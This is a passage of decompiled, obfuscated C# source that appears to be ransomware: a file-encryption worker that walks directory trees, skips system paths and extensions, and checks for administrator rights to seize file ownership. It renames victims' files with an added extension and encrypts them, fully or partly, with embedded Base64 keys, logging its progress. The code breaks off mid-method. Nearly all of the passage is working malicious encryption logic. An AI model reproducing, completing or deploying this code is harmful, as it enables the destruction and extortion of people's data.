using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using kUSxsBmhKmv;
using ygbKLEHbcCFNE;

namespace coxZRmDhvSAWo;

internal sealed class GhAMvbuoccW
{
	public sealed class dXtpYLlAbMp
	{
		private static StringCollection YkLwhicznNAwtvOO;

		private static List<string> hFeyBiheGelkT;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107403196));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if ((!text.ToLower().Contains(getString_0(107403191)) && !text.ToLower().Contains(getString_0(107403170)) && !text.ToLower().Contains(getString_0(107388745)) && !text.ToLower().Contains(getString_0(107388700)) && !text.ToLower().Contains(getString_0(107403189)) && !text.ToLower().Contains(getString_0(107388584)) && !text.ToLower().Contains(getString_0(107388964)) && !text.ToLower().Contains(getString_0(107388979)) && !text.ToLower().Contains(getString_0(107388930)) && !text.ToLower().Contains(getString_0(107388945)) && !text.ToLower().Contains(getString_0(107388911)) && !text.ToLower().Contains(getString_0(107388862)) && !text.ToLower().Contains(getString_0(107388877)) && !text.ToLower().Contains(getString_0(107388832)) && !text.ToLower().Contains(getString_0(107388843)) && !text.ToLower().Contains(getString_0(107388798)) && !text.ToLower().Contains(getString_0(107388817)) && !text.ToLower().Contains(getString_0(107388256)) && !text.ToLower().Contains(getString_0(107388271)) && !text.Contains(PbsdnvfpwWRvGCs(getString_0(107388222))) && !text.Contains(getString_0(107388197)) && !text.Contains(getString_0(107388184)) && !text.EndsWith(getString_0(107394893)) && !text.EndsWith(getString_0(107388159)) && !text.EndsWith(getString_0(107388154)) && !text.EndsWith(getString_0(107388181)) && !text.EndsWith(getString_0(107388176)) && !text.ToLower().Contains(getString_0(107388171)) && !text.ToLower().Contains(RoiBxbbYOpTnzdF)) || text.Contains(PbsdnvfpwWRvGCs(getString_0(107389037))))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(nsiwXjKpMUO) * 1024.0 * 1024.0 && HirTGWkSHczrmbY == getString_0(107396794))
							{
								hFeyBiheGelkT.Add(text);
							}
							else if (File.Exists(text) && HirTGWkSHczrmbY == getString_0(107396618))
							{
								hFeyBiheGelkT.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				array3 = array2;
				foreach (string string_ in array3)
				{
					WalkDirectoryTree(string_);
				}
			}
			return hFeyBiheGelkT;
		}

		static dXtpYLlAbMp()
		{
			Strings.CreateGetStringDelegate(typeof(dXtpYLlAbMp));
			YkLwhicznNAwtvOO = new StringCollection();
			hFeyBiheGelkT = new List<string>();
		}
	}

	private sealed class sUARzlGRFHDde
	{
		public string avfxhzATpymbWL;

		public bool _003CMain_003Eb__4(Process process_0)
		{
			return process_0.ProcessName == avfxhzATpymbWL;
		}
	}

	private sealed class NxIyepnTFBO
	{
		public string nvRebewysN;

		public bool _003CIsDriveNTFS_003Eb__17(DriveInfo driveInfo_0)
		{
			return driveInfo_0.RootDirectory.Name == nvRebewysN;
		}
	}

	private sealed class MCSuzJljyGwrZ
	{
		private sealed class uILPrdIBlgQjre
		{
			public MCSuzJljyGwrZ kEzRsJGIECQHC;

			public string UWCxsCbMhIkWpfJ;

			public void _003CCrypt_003Eb__21()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					sMlBAtMqAgeMq(WindowsIdentity.GetCurrent().Name, UWCxsCbMhIkWpfJ);
				}
			}

			public void _003CCrypt_003Eb__22()
			{
				uBTjgvutOlsTJ(UWCxsCbMhIkWpfJ, kEzRsJGIECQHC.nTBZXeQINsMZ, kEzRsJGIECQHC.SrUtXYDUZSmg, kEzRsJGIECQHC.CToRljeBfHM, kEzRsJGIECQHC.hSfGYaylYziGu);
			}
		}

		public string[] nTBZXeQINsMZ;

		public string[] CToRljeBfHM;

		public string hSfGYaylYziGu;

		public string SrUtXYDUZSmg;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__20(string string_0)
		{
			uILPrdIBlgQjre CS_0024_003C_003E8__locals0 = new uILPrdIBlgQjre();
			CS_0024_003C_003E8__locals0.kEzRsJGIECQHC = this;
			CS_0024_003C_003E8__locals0.UWCxsCbMhIkWpfJ = string_0;
			if (FRObTCxcUY && !oZZPobIwxSNjCO().Contains(getString_0(107386849)) && !oZZPobIwxSNjCO().Contains(getString_0(107386777)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						sMlBAtMqAgeMq(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.UWCxsCbMhIkWpfJ);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (rmNaxrdaErS == getString_0(107396801))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					uBTjgvutOlsTJ(CS_0024_003C_003E8__locals0.UWCxsCbMhIkWpfJ, CS_0024_003C_003E8__locals0.kEzRsJGIECQHC.nTBZXeQINsMZ, CS_0024_003C_003E8__locals0.kEzRsJGIECQHC.SrUtXYDUZSmg, CS_0024_003C_003E8__locals0.kEzRsJGIECQHC.CToRljeBfHM, CS_0024_003C_003E8__locals0.kEzRsJGIECQHC.hSfGYaylYziGu);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				uBTjgvutOlsTJ(CS_0024_003C_003E8__locals0.UWCxsCbMhIkWpfJ, nTBZXeQINsMZ, SrUtXYDUZSmg, CToRljeBfHM, hSfGYaylYziGu);
			}
		}

		static MCSuzJljyGwrZ()
		{
			Strings.CreateGetStringDelegate(typeof(MCSuzJljyGwrZ));
		}
	}

	private sealed class mDsrdwsfBAgqx
	{
		private sealed class bKLeOnnwOsJw
		{
			public mDsrdwsfBAgqx irnVJvnuIedJmu;

			public string ldrdWbhdALtRA;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__30()
			{
				try
				{
					if (fgLeGcGjPkpRXH)
					{
						Console.WriteLine(getString_0(107402704) + ldrdWbhdALtRA + getString_0(107402601) + new FileInfo(ldrdWbhdALtRA).Length + getString_0(107402580));
						Console.WriteLine(getString_0(107402679), SNtBTLidlROtoV.Count, qXIAEocyZgLqByS, LVKhJcfUHGhpJNXz);
						Console.WriteLine(getString_0(107402654), lBGXxmsJjqv.Elapsed);
						Console.WriteLine(getString_0(107402571));
					}
				}
				catch
				{
				}
			}

			static bKLeOnnwOsJw()
			{
				Strings.CreateGetStringDelegate(typeof(bKLeOnnwOsJw));
			}
		}

		private sealed class EaaSLAhSrkAd
		{
			public bKLeOnnwOsJw SnSgbcozGOnPa;

			public mDsrdwsfBAgqx irnVJvnuIedJmu;

			public string HaKItZSuWfQSFL;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__31()
			{
				foreach (string item in YoPwmbBPpdD)
				{
					if (HaKItZSuWfQSFL.ToLower().EndsWith(item + irnVJvnuIedJmu.MaDQWNsFQFSMFZ) && HFFrRFIpQgjXI == getString_0(107396816))
					{
						if (Convert.ToInt32(PZYHNDUWTf) * 1024 * 1024 > new FileInfo(HaKItZSuWfQSFL).Length)
						{
							try
							{
								yWTIBbUKdpiy.ybntlhJHhisLb(getString_0(107389891), getString_0(107389886), getString_0(107389841), HaKItZSuWfQSFL);
							}
							catch
							{
							}
						}
					}
					else if (HaKItZSuWfQSFL.ToLower().EndsWith(item) && HFFrRFIpQgjXI == getString_0(107396640))
					{
						try
						{
							yWTIBbUKdpiy.ybntlhJHhisLb(getString_0(107389891), getString_0(107389886), getString_0(107389841), HaKItZSuWfQSFL);
						}
						catch
						{
						}
					}
				}
			}

			static EaaSLAhSrkAd()
			{
				Strings.CreateGetStringDelegate(typeof(EaaSLAhSrkAd));
			}
		}

		private sealed class SmDDBVlBSoLlZfP
		{
			public mDsrdwsfBAgqx irnVJvnuIedJmu;

			public string ldrdWbhdALtRA;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__33()
			{
				try
				{
					if (fgLeGcGjPkpRXH)
					{
						Console.WriteLine(getString_0(107402711) + ldrdWbhdALtRA + getString_0(107402608) + new FileInfo(ldrdWbhdALtRA).Length + getString_0(107402587));
						Console.WriteLine(getString_0(107402686), SNtBTLidlROtoV.Count, qXIAEocyZgLqByS, LVKhJcfUHGhpJNXz);
						Console.WriteLine(getString_0(107402661), lBGXxmsJjqv.Elapsed);
						Console.WriteLine(getString_0(107402578));
					}
				}
				catch
				{
				}
			}

			public void _003CWorkerCrypter2_003Eb__34()
			{
				foreach (string item in YoPwmbBPpdD)
				{
					if (ldrdWbhdALtRA.ToLower().EndsWith(item + irnVJvnuIedJmu.MaDQWNsFQFSMFZ) && HFFrRFIpQgjXI == getString_0(107396819))
					{
						if (Convert.ToInt32(PZYHNDUWTf) * 1024 * 1024 > new FileInfo(ldrdWbhdALtRA).Length)
						{
							try
							{
								yWTIBbUKdpiy.ybntlhJHhisLb(getString_0(107389894), getString_0(107389889), getString_0(107389844), ldrdWbhdALtRA);
							}
							catch
							{
							}
						}
					}
					else if (ldrdWbhdALtRA.ToLower().EndsWith(item) && HFFrRFIpQgjXI == getString_0(107396643))
					{
						try
						{
							yWTIBbUKdpiy.ybntlhJHhisLb(getString_0(107389894), getString_0(107389889), getString_0(107389844), ldrdWbhdALtRA);
						}
						catch
						{
						}
					}
				}
			}

			static SmDDBVlBSoLlZfP()
			{
				Strings.CreateGetStringDelegate(typeof(SmDDBVlBSoLlZfP));
			}
		}

		public List<string> MWjzSWdUTiapH;

		public List<string> vJUzSMoRbycwzG;

		public string MaDQWNsFQFSMFZ;

		public string[] nBTsxqqCcIrA;

		public string MXXPCoXZKEzPC;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__2f(string string_0)
		{
			using List<string>.Enumerator enumerator = vJUzSMoRbycwzG.GetEnumerator();
			EaaSLAhSrkAd CS_0024_003C_003E8__locals0;
			while (enumerator.MoveNext())
			{
				bKLeOnnwOsJw CS_0024_003C_003E8__locals1 = new bKLeOnnwOsJw();
				CS_0024_003C_003E8__locals1.irnVJvnuIedJmu = this;
				CS_0024_003C_003E8__locals1.ldrdWbhdALtRA = enumerator.Current;
				if (((CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.Contains(getString_0(107389347)) || CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.Contains(getString_0(107388778)) || CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.Contains(getString_0(107388745)) || CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.ToLower().Contains(getString_0(107388760)) || CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.ToLower().Contains(getString_0(107388715)) || CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.Contains(getString_0(107388690)) || CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.Contains(getString_0(107388701)) || CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.ToLower().Contains(getString_0(107388656)) || CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.ToLower().Contains(getString_0(107388675)) || CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.ToLower().Contains(getString_0(107388638)) || CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.ToLower().Contains(getString_0(107388629)) || CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.ToLower().Contains(getString_0(107388612)) || CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.ToLower().Contains(getString_0(107388554)) || CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.ToLower().Contains(getString_0(107388565))) && !CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.Contains(PbsdnvfpwWRvGCs(getString_0(107389052)))) || CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.Contains(getString_0(107388979)) || CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.Contains(getString_0(107388994)) || CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.Contains(getString_0(107388945)) || CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.Contains(getString_0(107388960)) || CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.Contains(getString_0(107388911)) || CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.Contains(getString_0(107388926)) || CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.Contains(getString_0(107388877)) || CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.Contains(getString_0(107388892)) || CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.Contains(getString_0(107388847)) || CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.Contains(getString_0(107388858)) || CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.ToLower().Contains(getString_0(107388813)) || CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.ToLower().Contains(getString_0(107388832)) || CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.ToLower().Contains(getString_0(107388271)) || CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.ToLower().Contains(getString_0(107388286)) || CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.Contains(PbsdnvfpwWRvGCs(getString_0(107388237))) || CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.Contains(getString_0(107388212)) || CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.Contains(getString_0(107396229)) || CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.Contains(getString_0(107388199)) || CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.EndsWith(MaDQWNsFQFSMFZ) || CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.EndsWith(getString_0(107388174)) || CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.EndsWith(getString_0(107388169)) || CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.EndsWith(getString_0(107388196)) || CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.EndsWith(getString_0(107388191)) || CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.Contains(getString_0(107388186)) || CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.Contains(RoiBxbbYOpTnzdF) || CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.Contains(dtHHyJMWMTcTg) || CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.Contains(muQSQoYNOwJp))
				{
					continue;
				}
				if (nBTsxqqCcIrA.Length != 0)
				{
					string[] array = nBTsxqqCcIrA;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_10b9;
					}
				}
				try
				{
					if (CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.EndsWith(MaDQWNsFQFSMFZ))
					{
						goto IL_10b9;
					}
				}
				catch (Exception)
				{
					goto IL_10b9;
				}
				if (!CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.EndsWith(string_0) || SNtBTLidlROtoV.Contains(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA))
				{
					continue;
				}
				if (BBqvZtJMKtZyzF == getString_0(107396809))
				{
					try
					{
						if (uruahRFIszrntX.bURwEzWcMZKaoi(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA))
						{
							uruahRFIszrntX.BBxxokkeNIlNHfR(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA);
						}
					}
					catch
					{
					}
				}
				SNtBTLidlROtoV.Add(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA);
				Thread thread = new Thread((ThreadStart)delegate
				{
					try
					{
						if (fgLeGcGjPkpRXH)
						{
							Console.WriteLine(bKLeOnnwOsJw.getString_0(107402704) + CS_0024_003C_003E8__locals1.ldrdWbhdALtRA + bKLeOnnwOsJw.getString_0(107402601) + new FileInfo(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA).Length + bKLeOnnwOsJw.getString_0(107402580));
							Console.WriteLine(bKLeOnnwOsJw.getString_0(107402679), SNtBTLidlROtoV.Count, qXIAEocyZgLqByS, LVKhJcfUHGhpJNXz);
							Console.WriteLine(bKLeOnnwOsJw.getString_0(107402654), lBGXxmsJjqv.Elapsed);
							Console.WriteLine(bKLeOnnwOsJw.getString_0(107402571));
						}
					}
					catch
					{
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
				if (!HMEbcaxMfcYzgl.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA)))
				{
					HMEbcaxMfcYzgl.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA));
				}
				kstUyDfByMqYOzIx(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA);
				try
				{
					new SnjLOUpfRioti().fwTUnyzIwakYqxR(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (fgLeGcGjPkpRXH)
							{
								Console.WriteLine(getString_0(107403155) + CS_0024_003C_003E8__locals1.ldrdWbhdALtRA + getString_0(107402598) + new FileInfo(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA).Length + getString_0(107402577));
								Console.WriteLine(getString_0(107402568));
							}
						}
						catch
						{
						}
						xNqiyNeJTVFGU(PbsdnvfpwWRvGCs(getString_0(107402495)), getString_0(107388070) + CS_0024_003C_003E8__locals1.ldrdWbhdALtRA + getString_0(107388070) + PbsdnvfpwWRvGCs(getString_0(107402438)) + getString_0(107388070) + Environment.UserName + getString_0(107388070) + PbsdnvfpwWRvGCs(getString_0(107402453)));
					}
				}
				catch (Exception ex2)
				{
					if (CCDyMIHlAe)
					{
						try
						{
							File.AppendAllText(dtHHyJMWMTcTg, getString_0(107386991) + CS_0024_003C_003E8__locals1.ldrdWbhdALtRA + getString_0(107402428) + ex2.Message + getString_0(107395729));
						}
						catch (Exception)
						{
						}
					}
					continue;
				}
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex2)
					{
						if (CCDyMIHlAe)
						{
							try
							{
								File.AppendAllText(dtHHyJMWMTcTg, getString_0(107386991) + CS_0024_003C_003E8__locals1.ldrdWbhdALtRA + getString_0(107402827) + ex2.Message + getString_0(107395729));
							}
							catch (Exception)
							{
							}
						}
						LVKhJcfUHGhpJNXz++;
						goto end_IL_08b2;
					}
					byte[] bytes;
					if (QOKbVStgyeVL == getString_0(107396809) && new FileInfo(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA).Length > Convert.ToInt32(UawyhGBHBLgS) * 1024 * 1024 && !MWjzSWdUTiapH.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new EaaSLAhSrkAd();
						CS_0024_003C_003E8__locals0.SnSgbcozGOnPa = CS_0024_003C_003E8__locals1;
						CS_0024_003C_003E8__locals0.irnVJvnuIedJmu = this;
						try
						{
							if (MaDQWNsFQFSMFZ != getString_0(107386219))
							{
								if (YazilaoopZ)
								{
									MaDQWNsFQFSMFZ = tltXBlUAjNeRsFxCp + MaDQWNsFQFSMFZ;
								}
								File.Move(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA, CS_0024_003C_003E8__locals1.ldrdWbhdALtRA + MaDQWNsFQFSMFZ);
							}
						}
						catch (Exception ex2)
						{
							if (CCDyMIHlAe)
							{
								try
								{
									File.AppendAllText(dtHHyJMWMTcTg, getString_0(107386991) + CS_0024_003C_003E8__locals1.ldrdWbhdALtRA + getString_0(107402766) + ex2.Message + getString_0(107395729));
								}
								catch (Exception)
								{
								}
							}
							LVKhJcfUHGhpJNXz++;
							goto end_IL_08b2;
						}
						CS_0024_003C_003E8__locals0.HaKItZSuWfQSFL = getString_0(107389259);
						if (MaDQWNsFQFSMFZ != getString_0(107386219))
						{
							CS_0024_003C_003E8__locals0.HaKItZSuWfQSFL = CS_0024_003C_003E8__locals1.ldrdWbhdALtRA + MaDQWNsFQFSMFZ;
						}
						else
						{
							CS_0024_003C_003E8__locals0.HaKItZSuWfQSFL = CS_0024_003C_003E8__locals1.ldrdWbhdALtRA;
						}
						if (DXDIUZMazYGZy == getString_0(107396809))
						{
							Thread thread2 = new Thread((ThreadStart)delegate
							{
								foreach (string item in YoPwmbBPpdD)
								{
									if (CS_0024_003C_003E8__locals0.HaKItZSuWfQSFL.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.irnVJvnuIedJmu.MaDQWNsFQFSMFZ) && HFFrRFIpQgjXI == EaaSLAhSrkAd.getString_0(107396816))
									{
										if (Convert.ToInt32(PZYHNDUWTf) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.HaKItZSuWfQSFL).Length)
										{
											try
											{
												yWTIBbUKdpiy.ybntlhJHhisLb(EaaSLAhSrkAd.getString_0(107389891), EaaSLAhSrkAd.getString_0(107389886), EaaSLAhSrkAd.getString_0(107389841), CS_0024_003C_003E8__locals0.HaKItZSuWfQSFL);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.HaKItZSuWfQSFL.ToLower().EndsWith(item) && HFFrRFIpQgjXI == EaaSLAhSrkAd.getString_0(107396640))
									{
										try
										{
											yWTIBbUKdpiy.ybntlhJHhisLb(EaaSLAhSrkAd.getString_0(107389891), EaaSLAhSrkAd.getString_0(107389886), EaaSLAhSrkAd.getString_0(107389841), CS_0024_003C_003E8__locals0.HaKItZSuWfQSFL);
										}
										catch
										{
										}
									}
								}
							});
							thread2.Priority = ThreadPriority.Normal;
							thread2.IsBackground = false;
							thread2.Start();
						}
						bytes = Encoding.ASCII.GetBytes(EXVykcHaTCNay);
						if (nqNdPWHffReq == getString_0(107396633))
						{
							byte[] array2 = null;
							byte[] byte_ = NQdDIFAnEzVM.KQanXSigbuDh(CS_0024_003C_003E8__locals0.HaKItZSuWfQSFL, Convert.ToInt32(UawyhGBHBLgS) * 1024 * 1024);
							if (NQdDIFAnEzVM.EHTmbBVFpgxa(AaZhmxjLrXnGZ: (!uBIPmjbCjNt) ? (PAOJgADrbjEa ? NQdDIFAnEzVM.SvtZMRYDytMixf(byte_, Convert.FromBase64String(MXXPCoXZKEzPC), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : NQdDIFAnEzVM.SvtZMRYDytMixf(byte_, Convert.FromBase64String(MXXPCoXZKEzPC), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (PAOJgADrbjEa ? sAdFSOOagDt.tbzmVxgbIeuZ(byte_, Convert.FromBase64String(MXXPCoXZKEzPC), Convert.FromBase64String(sTQyJSLcZOIiC)) : sAdFSOOagDt.tbzmVxgbIeuZ(byte_, Convert.FromBase64String(MXXPCoXZKEzPC), Convert.FromBase64String(sTQyJSLcZOIiC))), zTKGzNBbRH: CS_0024_003C_003E8__locals0.HaKItZSuWfQSFL, KJxeENlSQsJIpV: bytes))
							{
								goto IL_10b9;
							}
							try
							{
								File.Move(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA + MaDQWNsFQFSMFZ, CS_0024_003C_003E8__locals1.ldrdWbhdALtRA);
							}
							catch (Exception)
							{
							}
						}
						else if (!PAOJgADrbjEa)
						{
							if (GeksFIyCuYbq.uVsAlcvYzOr(CS_0024_003C_003E8__locals0.HaKItZSuWfQSFL, UawyhGBHBLgS, MXXPCoXZKEzPC, null, Convert.FromBase64String(sTQyJSLcZOIiC)))
							{
								goto IL_10b9;
							}
							try
							{
								File.Move(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA + MaDQWNsFQFSMFZ, CS_0024_003C_003E8__locals1.ldrdWbhdALtRA);
							}
							catch (Exception)
							{
							}
						}
						else
						{
							if (GeksFIyCuYbq.uVsAlcvYzOr(CS_0024_003C_003E8__locals0.HaKItZSuWfQSFL, UawyhGBHBLgS, MXXPCoXZKEzPC, bytes, Convert.FromBase64String(sTQyJSLcZOIiC)))
							{
								goto IL_10b9;
							}
							try
							{
								File.Move(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA + MaDQWNsFQFSMFZ, CS_0024_003C_003E8__locals1.ldrdWbhdALtRA);
							}
							catch (Exception)
							{
							}
						}
						continue;
					}
					if (YazilaoopZ)
					{
						MaDQWNsFQFSMFZ = tltXBlUAjNeRsFxCp + MaDQWNsFQFSMFZ;
					}
					bytes = Encoding.ASCII.GetBytes(EXVykcHaTCNay);
					if (MaDQWNsFQFSMFZ != getString_0(107386219))
					{
						if (!UOlZmEwYRBbnfmvt)
						{
							if (!PAOJgADrbjEa)
							{
								fsRkhosBCvdFpjZ(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA, CS_0024_003C_003E8__locals1.ldrdWbhdALtRA + MaDQWNsFQFSMFZ, bGfpmpYMCsNkyjcK);
							}
							else
							{
								fsRkhosBCvdFpjZ(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA, CS_0024_003C_003E8__locals1.ldrdWbhdALtRA + MaDQWNsFQFSMFZ, Convert.FromBase64String(MXXPCoXZKEzPC));
							}
						}
						else
						{
							try
							{
								if (!PAOJgADrbjEa)
								{
									TMqDmSiJWGfZdl(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA, CS_0024_003C_003E8__locals1.ldrdWbhdALtRA + MaDQWNsFQFSMFZ, bGfpmpYMCsNkyjcK, Convert.FromBase64String(sTQyJSLcZOIiC));
								}
								else
								{
									TMqDmSiJWGfZdl(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA, CS_0024_003C_003E8__locals1.ldrdWbhdALtRA + MaDQWNsFQFSMFZ, Convert.FromBase64String(MXXPCoXZKEzPC), Convert.FromBase64String(sTQyJSLcZOIiC));
								}
							}
							catch (Exception ex2)
							{
								if (CCDyMIHlAe)
								{
									try
									{
										File.AppendAllText(dtHHyJMWMTcTg, getString_0(107386991) + CS_0024_003C_003E8__locals1.ldrdWbhdALtRA + getString_0(107386237) + ex2.Message + getString_0(107395729));
									}
									catch (Exception)
									{
									}
								}
								LVKhJcfUHGhpJNXz++;
								try
								{
									File.Move(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA + MaDQWNsFQFSMFZ, CS_0024_003C_003E8__locals1.ldrdWbhdALtRA);
								}
								catch (Exception)
								{
								}
								goto end_IL_08b2;
							}
						}
					}
					else if (!UOlZmEwYRBbnfmvt)
					{
						if (!PAOJgADrbjEa)
						{
							fsRkhosBCvdFpjZ(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA, CS_0024_003C_003E8__locals1.ldrdWbhdALtRA + getString_0(107386214), bGfpmpYMCsNkyjcK);
						}
						else
						{
							fsRkhosBCvdFpjZ(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA, CS_0024_003C_003E8__locals1.ldrdWbhdALtRA + getString_0(107386214), Convert.FromBase64String(MXXPCoXZKEzPC));
						}
					}
					else
					{
						try
						{
							if (!PAOJgADrbjEa)
							{
								TMqDmSiJWGfZdl(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA, CS_0024_003C_003E8__locals1.ldrdWbhdALtRA, bGfpmpYMCsNkyjcK, Convert.FromBase64String(sTQyJSLcZOIiC));
							}
							else
							{
								TMqDmSiJWGfZdl(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA, CS_0024_003C_003E8__locals1.ldrdWbhdALtRA, Convert.FromBase64String(MXXPCoXZKEzPC), Convert.FromBase64String(sTQyJSLcZOIiC));
							}
						}
						catch (Exception ex2)
						{
							if (CCDyMIHlAe)
							{
								try
								{
									File.AppendAllText(dtHHyJMWMTcTg, getString_0(107386991) + CS_0024_003C_003E8__locals1.ldrdWbhdALtRA + getString_0(107386237) + ex2.Message + getString_0(107395729));
								}
								catch (Exception)
								{
								}
							}
							LVKhJcfUHGhpJNXz++;
							goto end_IL_08b2;
						}
					}
					if (PAOJgADrbjEa)
					{
						if (MaDQWNsFQFSMFZ != getString_0(107386219))
						{
							XZXEHUgcqrufd(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA + MaDQWNsFQFSMFZ, bytes);
						}
						else
						{
							XZXEHUgcqrufd(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA, bytes);
						}
					}
					goto IL_10b9;
					end_IL_08b2:;
				}
				catch (Exception)
				{
					goto IL_10b9;
				}
				continue;
				IL_10b9:
				vJUzSMoRbycwzG.Remove(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA);
			}
		}

		public void _003CWorkerCrypter2_003Eb__32(string string_0)
		{
			SmDDBVlBSoLlZfP CS_0024_003C_003E8__locals0 = new SmDDBVlBSoLlZfP();
			CS_0024_003C_003E8__locals0.irnVJvnuIedJmu = this;
			CS_0024_003C_003E8__locals0.ldrdWbhdALtRA = string_0;
